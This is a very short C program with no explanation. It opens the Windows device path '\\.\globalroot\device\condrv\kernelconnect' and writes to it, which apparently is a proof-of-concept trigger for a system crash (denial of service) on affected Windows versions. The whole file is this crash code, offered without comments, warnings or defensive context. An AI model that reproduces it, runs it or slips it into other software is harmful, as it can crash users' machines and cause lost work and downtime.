#include <stdio.h>

int main()
{
    FILE *ptr=fopen("\\\\.\\globalroot\\device\\condrv\\kernelconnect","a");
    fprintf(ptr," ");
    fclose(ptr);
    return 0;
}
